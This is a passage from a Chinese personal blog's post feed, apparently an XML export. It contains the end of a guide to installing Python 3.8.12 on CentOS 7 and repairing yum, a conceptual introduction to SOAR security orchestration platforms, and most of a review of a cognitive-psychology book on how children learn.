id="三、下载python源码包"><a href="#三、下载python源码包" class="headerlink" title="三、下载python源码包"></a>三、下载python源码包</h1><p>python官网<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a> 目前python最新版本是python3.10<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211104/%E4%B8%8B%E8%BD%BDpython.png" alt="下载Python源码包"></p><p>下载稳定版本3.8版</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.8.12/Python-3.8.12.tgz</span><br></pre></td></tr></table></figure><h1 id="四、解压安装python源码包"><a href="#四、解压安装python源码包" class="headerlink" title="四、解压安装python源码包"></a>四、解压安装python源码包</h1><h2 id="1、解压"><a href="#1、解压" class="headerlink" title="1、解压"></a>1、解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf Python-3.8.12.tgz</span><br></pre></td></tr></table></figure><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>进入解压后的目录进行编译和安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Python-3.8.12/</span><br><span class="line">[root@localhost Python-3.8.12]<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># ./configure</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># make&amp;&amp;make install</span></span><br></pre></td></tr></table></figure><p>执行完后显示安装成功<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211104/python%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="pyhont安装成功"></p><h2 id="3、建立命令软链接"><a href="#3、建立命令软链接" class="headerlink" title="3、建立命令软链接"></a>3、建立命令软链接</h2><p>虽然python3.8.12安装成功了，但默认输入python还是显示是2.7版本的。如果要用python3.8.12需要输入python3即可，有时候不太方便。可以通过修改软链接的方式将默认的python指向python3.8.12。<br>先看一下默认的python及新安装的python3都安装在哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># which python</span></span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># which python3</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/python3</span><br></pre></td></tr></table></figure><p>可以看到默认的python路径为/usr/bin/python，python3的路径为/usr/local/bin/python3<br>将python3的软链接加到python上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># mv /usr/bin/python /usr/bin/python.bak</span></span><br><span class="line">[root@localhost Python-3.8.12]<span class="comment"># ln -s /usr/local/bin/python3 /usr/bin/python</span></span><br></pre></td></tr></table></figure><p>通过python -V命令查看python版号，这时python的版本已经是3.8.12了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># python -V</span></span><br><span class="line">Python 3.8.12</span><br></pre></td></tr></table></figure><p>pip命令也可以修改，python3.8.12默认的pip是pip3，CentOS7的python2.7默认没有安装pip.<br>输入pip命令的时候提示命令没有找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># pip</span></span><br><span class="line">bash: pip: <span class="built_in">command</span> not found...</span><br></pre></td></tr></table></figure><p>这时也可以通过建立软链接的方式将pip命令链接到pip3上。首先看pip3命令在哪?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># which pip3</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pip3</span><br></pre></td></tr></table></figure><p>然后建立pip到pip3的软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># ln -s /usr/local/bin/pip3 /usr/bin/pip</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># pip -V</span></span><br><span class="line">pip 21.1.1 from /usr/<span class="built_in">local</span>/lib/python3.8/site-packages/pip (python 3.8)</span><br></pre></td></tr></table></figure><h1 id="五、配置yum"><a href="#五、配置yum" class="headerlink" title="五、配置yum"></a>五、配置yum</h1><p>安装python3改完软链接以后发现yum命令报错了，yum是依赖python2.7的，你把python改成了3.8了，所以报错了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Python-3.8.12]<span class="comment"># yum</span></span><br><span class="line">  File <span class="string">"/usr/bin/yum"</span>, line 30</span><br><span class="line">    except KeyboardInterrupt, e:</span><br><span class="line">                            ^</span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure><p>可以修改yum里对python2的依赖即可。虽然安装了python3但是系统里python2依旧还在系统里，可以通过python2来指定用python2.7的命令，首先来看下python2的命令在哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># which python2</span></span><br><span class="line">/usr/bin/python2</span><br></pre></td></tr></table></figure><p>可以cd到/usr/bin目录下 通过ls -alh|grep python查看python命令的详细情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost bin]<span class="comment"># ls -alh|grep python</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211104/python%E8%BD%AF%E9%93%BE%E6%8E%A5.png" alt="python命令软链接"><br>可以看到python软连接是执行的python3命令，python2是执行的python2.7的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/libexec/urlgrabber-ext-down</span><br></pre></td></tr></table></figure><p>修改对python的依赖，修改成python2或python2.7都可以。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211104/%E4%BF%AE%E6%94%B9yun%E4%BE%9D%E8%B5%961.png" alt="修改依赖"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/bin/yum</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211104/%E4%BF%AE%E6%94%B9yum%E4%BE%9D%E8%B5%962.png" alt="修改依赖"></p><p>修改完这两个文件后，再敲yum命令就不会报错了。</p><p><strong>至此CentOS7环境下python3.8.12已经成功安装！</strong></p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识SOAR-安全事件编排自动化响应</title>
      <link href="/posts/63a3c769/"/>
      <url>/posts/63a3c769/</url>
      
        <content type="html"><![CDATA[<p>SOAR是最近几年安全市场上最火热的词汇之一。SOAR究竟是什么，发展历程是什么，能够起什么作用，带着这些问题我们来认识一下SOAR。</p><h1 id="一、SOAR是什么"><a href="#一、SOAR是什么" class="headerlink" title="一、SOAR是什么"></a>一、SOAR是什么</h1><p>SOAR 一词来自分析机构 Gartner，SOAR-Security Orchestration, Automation and Response 安全编排和自动化响应。在Gartner的报告里，SOAR平台的核心组件为，编排与自动化、工作流引擎、案例与工单管理、威胁情报管理。而SOAR体系则是三个概念的交叉重叠：<strong>SOAR=SOA+SIRP+TIP</strong><br>1）精密编排的联动安全解决方案(SOA)；<br>2）事件应急响应平台(SIRP)；<br>3）威胁情报平台(TIP)。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211101/soar.png" alt="SOAR"></p><h1 id="二、SOAR的发展历程"><a href="#二、SOAR的发展历程" class="headerlink" title="二、SOAR的发展历程"></a>二、SOAR的发展历程</h1><p>2015年，可以定义为SOAR的1.0时代。Gartner将SOAR(当时被认为是“安全运维分析和报告”)描述成为安全运维团队提供机器可读的安全数据报告和分析管理功能的产品。2017年，SOAR进入2.0时代。Gartner提出了“安全编排、自动化及响应”(SOAR)这个术语，用以描述脱胎于事件响应、安全自动化、场景管理和其他安全工具的一系列新兴平台。Gartner观察到三种以前截然不同的技术：安全编排和自动化(SOA)、安全事件响应平台(SIRPs)和威胁情报平台(TIPs)，正在逐步融合到一起。<br>根据Gartner2019年最新定义，SOAR是指能使企业组织从SIEM等监控系统中收集报警信息，或通过与其它技术的集成和自动化协调，提供包括安全事件响应和威胁情报等功能。SOAR技术市场最终目标是将安全编排和自动化(SOA)、安全事件响应(SIR)和威胁情报平台(TIP)功能融合到单个解决方案中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211101/soar%E7%9A%84%E6%BC%94%E8%BF%9B.png" alt="SOAR的演进"></p><p>根据Gartner预测，到2022年，有30%大型企业组织（安全团队超过5人）将在安全和运维的工作中使用SOAR，这一比例远超当下5%。当下SOAR技术的早期拥护者是那些已经拥有成熟安全运维中心，并且能够理解SOAR带来好处的那些成熟的安全组织。</p><h1 id="三、SOAR主要解决什么问题"><a href="#三、SOAR主要解决什么问题" class="headerlink" title="三、SOAR主要解决什么问题"></a>三、SOAR主要解决什么问题</h1><p>随着网络安全攻防对抗的日趋激烈，网络安全单纯指望防范和阻止的策略已经失效，必须更加注重检测与响应。企业和组织要在网络已经遭受攻击的假定前提下构建集阻止、检测、响应和预防于一体的全新安全防护体系。在国际上，检测和响应类产品受到了极大的关注。放眼国内，更多的注意力集中到了新型检测产品，尤其是未知威胁检测领域。借助这些产品和技术，用户获得了更低的 MTTD（平均检测时间），能够更快更准确地检测出攻击和入侵。但是，这些产品和技术大都没有帮助用户降低 MTTR（平均响应时间）。事实上，对于用户而言，更快地检测出问题仅仅是第一步，如何快速地对问题进行响应更加重要。而在提升安全响应效率的时候，不能仅仅从单点（譬如单纯从端点或者网络）去考虑，还需要从全网整体安全运维的角度去考虑，要将分散的检测与响应机制整合起来。而这，正是 SOAR 要解决的问题。<br>Gartner指出，SOAR可供公司企业收集不同来源的安全威胁数据和警报，运用人机结合的方法进行事件分析与分类，根据标准流程辅助定义、排序和驱动标准化事件响应行为。SOAR主要为安全团队提供定制化的流程和控制，弥合并加速有效网络威胁的调查与缓解。安全运营团队的大量日常事务性工作也可以借助SOAR加以自动化。而且，案例战术手册还可以帮助分析师在单一平台上响应和缓解威胁，节约事件响应的每一分每一秒宝贵时间。<br>Gartner 用 OODA 模型，来描绘一个典型的安全运营流程。OODA 即 Observe(观察)、Orient(定位)、Decide(决策)、Act(行动)。</p><ul><li>观察：观察事件并确定发生了什么，即通过各种检测、分析工具，比如 SIEM 类工具，找到威胁线索，如告警。</li><li>定位：确定观察的方向，并添加上下文来确定观察的含义，即对产生的告警的内容做调查、丰富化。比如查找外网域名的威胁情报，查找此 IP 的历史行为协助研判等等。</li><li>决策：根据业务的风险容忍度和能力决定适当的响应行动，即判定是否需要对此告警采取行动，比如是否需要封禁，是否影响业务，是否需要进一步观察。</li><li>行动：根据决定采取行动，并应用到观察过程中，然后重复，即执行确定的安全策略，并验证。每一步都对下一步提供了指导，周而复始，构成了一个良性促进的进化循环，不断优化企业的安全运营流程以应对不断变化的安全威胁。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211101/ooda.png" alt="OODA 模型"></li></ul><p>OODA 环看起来逻辑清晰，易于操作。但事实上， OODA 环里的丰富化、调查取证、验证、执行安全策略变更等等，都是耗时耗力的工作。加上安全设备一直以来的误报问题产生的噪音，以及安全人员工作负荷重，资深从业人员短缺等原因，难以真正有效的推进 OODA 循环。更不用提在 HW 时段高强度的工作压力下，如何能够有条不紊的保持一贯的处置流程来处理每一个安全线索。SOAR 正是在这个背景下被提出，并被寄予厚望。SOAR 的核心，就是将安全流程或预案，即 OODA 循环的每一个实例，比如蠕虫爆发处理流程、挖矿病毒告警处理流程、疑似钓鱼邮件处理流程等等，数字化管理起来形成 Playbook。用自动化完成其中所有可能自动化的动作，无法自动的仍然交由人来处理，通过可视化编排工具将人、技术和流程有机的结合起来，形成标准统一的、可重复的、更高效的安全运营流程。</p><h1 id="四、SOAR的核心功能"><a href="#四、SOAR的核心功能" class="headerlink" title="四、SOAR的核心功能"></a>四、SOAR的核心功能</h1><p>从SOAR安全编排自动化响应的字面定义来看SOAR应该具备三大核心能力，编排、自动化、响应</p><h2 id="编排"><a href="#编排" class="headerlink" title="编排"></a>编排</h2><p>SOAR中的关键词是编排，这是在使用自动化和响应之前必须构建的关键组件。SOAR的编排体现的是一种协调和决策的能力，针对复杂性的安全事件，通过编排将分析过程中各种复杂性分析流程和处理平台进行组合。分析涉及多种数据或平台，如SIEM分析平台、漏洞管理平台、情报数据、资产数据等。处置响应的编排也涉及到很多平台或设备，如EDR管理平台、运维管理平台、工单管理平台、WAF设备、防火墙等。仅仅以技术为中心的安全保障已不再能满足现状，将人员和流程的编排才能保证安全流程真正高效的运行。SOAR的终极目标就是实现技术、流程、人员的无缝编排。</p><h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>SOAR的自动化体现在三个方面，面对需要处理的安全事件能够根据策略自动选择编排的剧本、自动执行剧本的操作流程、根据决策结果自动联动设备进行防护阻断等行动策略。它允许剧本（常称为Playbooks）在安全流程的部分或全部内容上执行多个任务，将线性剧本串联起来。虽然线性剧本可能更容易创建，但只适用于处理决策需求较少的工作流。编排和自动化比线性剧本的最大优势就是其灵活性，为支持全自动化和半自动化的决策，需要更加灵活的工作流和执行剧本。SOAR能够识别这些决策模式，并基于以往事件中的执行操作，自动推荐新事件的剧本、执行剧本操作流程，自动化分析决策，根据决策结果自动下发防护阻断的行动策略。</p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>安全事件响应包括告警管理、工单管理、案件管理等功能。告警管理的核心不仅是对告警安全事件的收集、展示和响应，更强调告警分诊和告警调查。只有通过告警分诊和告警调查才能提升告警的质量，减少告警的数量。工单管理适用于中大型的安全运维团队协同化、流程化地进行告警处置与响应，并且确保响应过程可记录、可度量、可考核。案件管理是现代安全事件响应管理的核心能力。案件管理帮助用户对一组相关的告警进行流程化、持续化的调查分析与响应处置，并不断积累该案件相关的痕迹物证 (IOC) 和攻击者的战技过程指标信息 (TTP)。多个案件并行执行，从而持续化地对一系列安全事件进行追踪处置。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211101/soar2.png" alt="SOAR事件响应"></p><p>事件响应是SOC操作中非常复杂的部分，理想状态下，它将是一个有效的动态过程，涉及数十种相互关联的技术、IT、业务流程和整个组织的人员，将是持续性适应风险和信任评估（Continuous Adaptive Risk and Trust Assessment, CARTA）策略用于在持续监测和可视性方面时，SOC团队可使用SOAR技术执行连续活动，利用SOAR技术通过智能化编排与响应最大程度的将已有安全技术进行整合，提高整个安全事件的解决能力和效率。基于编排和自动化前期对事件的分析，SOAR所提供的响应技术是完善整个事件生命周期，提高解决安全威胁效率的关键一环。本质上，SOAR的最终目标是促进安全团队对事件有全面的、端到端的理解，完成更好、更明智响应。</p><h1 id="五、SOAR的价值"><a href="#五、SOAR的价值" class="headerlink" title="五、SOAR的价值"></a>五、SOAR的价值</h1><p><strong>1、缩短响应时间</strong><br>通过自动化技术，尽可能多的自动完成一个安全事件处置流程中相关步骤，从而缩短响应时间即 MTTR。<br><strong>2、释放人力</strong><br>让安全专家从繁重的重复劳动中释放出来，将时间放在更有价值的安全分析、威胁猎捕、流程建立等工作上。<br><strong>3、安全运营流程标准化</strong><br>将公司的安全运营流程数字化管理起来，每一次安全事件的对应处置过程都在统一标准，统一步骤下执行，有迹可循。避免人员能力的差距导致的处置实际效果不可控。<br><strong>4、避免能力断层</strong><br>将安全专家的经验固化成处置预案Playbook，让不同的人都可以遵循同样的方法来完成特定安全事件的处置流程，避免因为个人的离职导致某个领域的安全能力缺失。<br><strong>5、运营流程指标可度量</strong><br>因为运营流程都通过 Playbook 数字化管理且每一次的执行过程都记录在案，因此流程的 KPI 如 MTTD、MTTR、TTQ、TTI 等全部可评估、可度量、可追踪。<br><strong>6、安全运营决策支撑</strong><br>通过对公司的所有运营流程数字化管理、数字化执行、数字化KPI评估后，管理者可以有效的评估什么流程基本无用，什么流程执行效率不高，什么流程发挥了最大的作用，甚至什么安全设备在所有流程中被使用的价值最大。从而为以后的安全投资决策，安全团队建设决策提供有价值的数值化支撑。</p><h1 id="六、SOAR与其他安全产品的关系"><a href="#六、SOAR与其他安全产品的关系" class="headerlink" title="六、SOAR与其他安全产品的关系"></a>六、SOAR与其他安全产品的关系</h1><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211101/soar3.png" alt="SOAR与其他安全产品的关系"></p><p>SOAR定位于安全运营操作平台，它收集不同来源的安全威胁数据和警报，事件来源于其他的态势感知平台、SIEM、日志分析系统或安全人员人工录入需要处理的事件。通过调用安全设备的能力如：情报平台、资产管理平台、漏洞扫描平台、EDR管理平台、运维管理平台、工单管理平台、WAF设备、防火墙来实现对安全事件的分析、溯源、取证、处置、通知等。一端接安全事件源，一端对接安全设备能力。通过SOAR本身的编排能力将人员、设备、资源、流程协同起来。每个企业部署流程和技术并不相同，SOAR在实际落地应用过程中并不能“即插即用”，需要对接事件源、对接各类联动处置设备，根据企业具体的实际情况定制剧本流程。对接的实际安全设备能力数量以及剧本的积累，是SOAR平台能够很好的支持运营的关键。</p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大脑不是用来思考的，如何让孩子更好的学习？</title>
      <link href="/posts/8394d1a3/"/>
      <url>/posts/8394d1a3/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20210822/%E8%AF%BB%E4%B9%A6.png" alt="读书"></p><p>在这个知识爆炸、学习竞争压力巨大的时代，让父母最焦虑的事情之一，莫过于家里有个厌学的孩子了。为了让孩子好好学习，家长们操碎了心。为了孩子报各种培训辅导班、自己亲自上阵陪同辅导、高价请一对一的家教辅导，就差自己代替孩子去学习了。而孩子依旧是，一写作业就磨蹭、一考试就不会、一上学就无精打彩，一放学就满血复活。为什么学生不喜欢上学？如何让孩子喜欢并更好的学习呢？让我们跟着这本《为什么学生不喜欢上学?》一起来探索学习的秘密。<br><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20210822/%E6%88%91%E7%9A%84%E5%BF%83%E9%87%8C%E5%8F%AA%E6%9C%89%E5%AD%A6%E4%B9%A0.jpg" alt="我的心里只有学习"><br>《为什么学生不喜欢上学?》是一本关于认知心理学的普及读物，也是一本教育心理学的入门书籍。作为美国弗吉尼亚大学心理学教授威林厄姆的重要著作，是一本深受学生和教师欢迎的教育心理学著作。他用认知心理学的原理，详细分析了学生学习的过程和教师在课堂教学中必须注意的一些问题。</p><p>作者丹尼尔·T·威林厄姆，哈佛大学心理学博士，美国弗吉尼亚大学心理学教授。主要研究以大脑为基础的学习和记忆及认知心理学的基础教育应用。《美国教育家》杂志《向认知科学家提问》专栏作者。</p><p>这本书有着容易被人忽视和低估的名字，实际上它是一本认知心理学和教育心理学的科普著作，长期在美国亚马逊图书榜畅销不衰。在豆瓣评分高达9.3分！</p><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20210822/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AD%A6%E7%94%9F%E4%B8%8D%E5%96%9C%E6%AC%A2%E4%B8%8A%E5%AD%A6.png" alt="为什么学生不喜欢上学"><br>书中主要提出并回答了这些问题：</p><ul><li>为什么学生不喜欢上学？</li><li>为什么学生能记住电视里的所有细节，却记不住我们教他的知识？</li><li>为什么让学生理解抽象概念这么难？</li><li>题海战术有用吗？</li><li>科学家是怎样思考的？如何让学生像专家一样思考？</li><li>如何因材施教？</li></ul><p>这本书刷新了很多人对学习的认知，不仅仅适合学生，同样适合处于终生学习时代的你和我。如果你的小学老师能早一点看到，你也就不会讨厌学习了。当然，现在的你看了也同样不晚。不论是教育孩子还是自己，了解了认知学的原理，按照符合科学原理的方法去做，都会让大家的学习更有效率。特别是，本书有许多震撼人心、不符合我们直觉的认知让我们重新去思考如何去更好的学习。</p><h3 id="学生为什么不爱学习？"><a href="#学生为什么不爱学习？" class="headerlink" title="学生为什么不爱学习？"></a><strong>学生为什么不爱学习？</strong></h3><p>从认知心理学的角度来看，人是充满好奇心的，愿意探索了解一切；也喜欢思考，因为思考就是解决问题，而解决问题能带来愉悦感。比如当你苦苦思索，终于解出了一道难题或者想通了一件事情，你的大脑可能奖励它自己少量的多巴胺，让你恨不得手舞足蹈，瞬间自信心爆棚，觉得自己是世界上最棒的人。这种快乐，跟吃个甜点是完全不一样。学习应该是件很快乐的事情。</p><p>既然解决问题也能带来快乐，那为什么还有这么多人不愿意思考，不愿意学习呢？</p><p><strong>因为：大脑不是用来思考的！！！</strong></p><p>看到这里估计大家会一脸闷逼，大脑不是用来思考的，哪是用来干啥的呢？是的，大脑能做很多事情，但思考并不是它最拿手的，人类不常思考是因为我们的大脑<strong>不是用来思考，而是用来避免思考的</strong>。思考很费力，而且它还是缓慢、靠不住的。幸运的是尽管我们并不擅长思考，但我们其实喜欢思考，我们生来就有着好奇心，也寻找可以进行思考的机会。但正是因为思考很难，需要条件合适，这份好奇心才能存活，否则我们很快就会放弃思考的念头。<strong>好奇心是与生俱来的，但它很脆弱</strong>。思考的愉悦感来自解决问题的过程，在一个要解决的问题上毫无进展是不会有愉悦感的，实际上，还会让你沮丧。同样只是知道问题的答案也不会有多大的愉悦感。如何保持好奇心，激发思考的兴趣呢？答案是思考问题的难易程度。太容易的问题不会带来愉悦感，同样太难的问题不但不会带来愉悦感还会带来挫折感让人渐渐的避免思考。</p><p><strong>所以：要确保提供给学生的问题是可以解决的。尊重学生的认知局限和个体间的认知差异，难易适中。</strong></p><p>根据资料，认知心理学把人类对于外部世界的认识分成了三个区域：舒适区、学习区、恐慌区。其中，“舒适区”是对自己来说没有学习难度的知识，接触这类知识感觉很舒适，但可学到的东西很少，进展缓慢；“学习区”有一定挑战，接触时会感到不适，但又不至于太难受，保持在这个区间学习，可以得到快速成长；“恐慌区”是超出自己能力范围太多的知识，接触会感到忧虑、恐惧，不堪负重以至放弃学习。学习具有适当挑战的东西，一段时间后，“学习区”会慢慢变为“舒适区”， 而一部分的“恐慌区” 又会变成“学习区”。<br><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20210822/%E8%88%92%E9%80%82%E5%8C%BA.jpg" alt="舒适区、学习区、恐慌区"></p><p>在舒适区学习，会因为太容易而觉得枯燥，无法坚持；在恐慌区学习，会因为太难好奇心受挫，很快就放弃。所以学习任务要难易适中。要确保在学习过程中碰到的问题可以被解决。</p><h3 id="在学习的过程中死记硬背是否合理？"><a href="#在学习的过程中死记硬背是否合理？" class="headerlink" title="在学习的过程中死记硬背是否合理？"></a><strong>在学习的过程中死记硬背是否合理？</strong></h3><p>一般大家都会死记硬背的学习方法嗤之以鼻，认为是读死书。然而你错了！有些东西该背的还得背，该记的还得记。事实性知识要先于技能，也就是说如9*9乘法表，元素周期表、历史年代表、一些常识等等，必须得用心记下，这些都是学习的基石。</p><p>毫无疑问，让学生记住枯燥的事实是完全不够的，需要进行关联和分析。但是同样，如果没有事实性知识想要凭空让学生拥有分析能力或者归纳能力是不可能的。</p><p><strong>因为：</strong><br><strong>第一，背景知识对阅读理解来说必不可少</strong>。它帮我们在单个的要点之间建立起联系。</p><p><strong>第二，背景知识对于我们的认知是必要的</strong>。一个人看起来在进行逻辑思考，但其实大部分是在进行记忆检索。它使我们能够将独立的元素合成一个单元，进而增加工作记忆的空间。</p><p><strong>第三，事实性知识可以增强记忆</strong>。如果你对一方面了解的越多，你就越能更好的理解这方面的新知识。</p><p>长期记忆中的事实性记忆使得获取更多的事实性知识更容易，它说明持有的信息量取决于已有的信息量。</p><p><strong>所以：</strong><br>我们必须让学生学习背景知识。学生必须学会反复出现的概念–统一所有学科的思想。</p><p><strong>知识体系在先，批判性思维在后</strong>。批判性思考并不能够脱离背景知识而单独实践以至完善的。<br>具有浅显知识都比没有知识强。了解的深固然好，但是我们不可能细致地了解每一件事情，泛泛的知识显然比不懂要强。</p><p><strong>加强阅读</strong>。大量的数据证实，读“闲书”的人一生都因此受益。</p><p><strong>偶然获得知识</strong>。学习事实性知识可以随时随地的学习如读闲书、翻杂志、看记录片、新闻或者和朋友聊天都可以获得相应的知识。</p><p><strong>尽早开始</strong>。家庭环境的培养，如父母使用的语言、书籍资源是否可得、家长是否平时看书。等等还有其他一些因素决定了孩子在上学前拥有的知识。</p><h3 id="题海战术到底有没有用？"><a href="#题海战术到底有没有用？" class="headerlink" title="题海战术到底有没有用？"></a><strong>题海战术到底有没有用？</strong></h3><p>题海战术也是比较有争议的学习方法，现在有一种观点认为，题海战术只对提高考试成绩有帮助，扼杀了学生内在的学习动力，是现行教育下的畸形产物，它带来的弊远大于利。但同时也有教育专家跳出来说，学生必须反复地练习才能学会知识和技能。两者孰是孰非？</p><p>在认知学看来，练习是最有效的窍门之一，它减少了大脑活动需要的空间。没有充分的练习，你不可能精通任何脑力活。</p><p>为什么要练习？因为通过练习能获得最基本的能力，以期精益求精。如果你作为足球运动员在带球的同时还要思考踢球的角度和速度，你不太可能成为一个优秀的足球运动员。你必须得日复一日的练习。像这样的低层次过程必须不假思索，才能给更高层次的过程，比如战术策略提供足够的空间。类似的，你如果不熟记数据要诀也学不好代数。练习的目的是获得能力和提高能力。</p><p><strong>因为：</strong></p><p><strong>练习是为了日后更好的学</strong>习。通过大量的练习会让一些步骤变得自动化，学习者才能将思考能力提高到下一个层次。让思考过程变得省力，这样才能学得更多。</p><p><strong>练习使记忆更长久</strong>。努力学习显然不能防止遗忘，但持续地练习可以防止遗忘。</p><p><strong>练习促进知识的迁移</strong>。重复做很多某一类型的题目使你更容易辨识一个新问题的内在结构，即使你以前没有见过这一题目。</p><p>但是，不是每件事情都需要无限度地练习的。</p><p><strong>所以：</strong></p><p>如果练习可以让思考过程变得省力，我们就要去识别哪些过程需要自动化，总的来说需要自动化的过程往往是自动化后效益能达到最大值的技能的基础。</p><p><strong>分散练习时间</strong>。没有必要把关于一个概念的所有练习集中在很短的一段时间里完成。分散练习后记忆会更持久。持续不断地练习同一项技能是很无聊的事，最好能有点变化。分散练习的另一个好处是学习者有更多的时间思考如何将学到的东西加以应用。</p><p><strong>在进阶环境中练习</strong>。自动化需要很多练习，聪明的办法是既分散练习的时间，又分散练习的环境。尽量多的设计有创意的方法来练习最关键的技巧，同时让学习者在更高阶的环境中学到基本技能。</p><h3 id="有些孩子天生就不是学习的料？"><a href="#有些孩子天生就不是学习的料？" class="headerlink" title="有些孩子天生就不是学习的料？"></a><strong>有些孩子天生就不是学习的料？</strong></h3><p>有些人认为，学习能力是受基因影响，如果你的基因优秀，你就聪明；基因不好，就不聪明。你聪明就可以学得很好。另外一种看法就是认为智能是可以塑造的。如果考试考砸了或不理解某个知识点，不是因为笨，而是因为他们还不够努力。哪一种看法是正确的呢？</p><p>答案是：两者都有正确的部分。我们的基因遗传确实对智能有影响，但是通常是通过环境影响的。毫无疑问智能是可以改变的！</p><p>孩子智能上的差异可以通过持久的努力来改变。</p><p><strong>因为：</strong></p><p><strong>对于智能，态度很重要</strong><br>有充分证据证明，相信智能可以通过努力提高的学生比相信智能是改变不了得事情的学生学得更好，得到的分数更高。<br>孩子必须知道他的能力决定他所作事情时的成功率，他需要发展对于自己能力的自信，而且还要理解，对于不同类型的任务他拥有不同级别的能力。</p><p><strong>所以：</strong></p><p>要确保孩子相信自己能够进步，要让他们相信为此所作的努力是值得的。</p><p><strong>赞扬努力，而非能力</strong>。赞扬过程而不是能力，赞扬孩子面对困难时坚持不懈的精神或对作业负责的态度。</p><p>告诉他们<strong>一份耕耘一份收获</strong>。所有的所谓“天才”都是持续努力的结果。</p><p><strong>坦然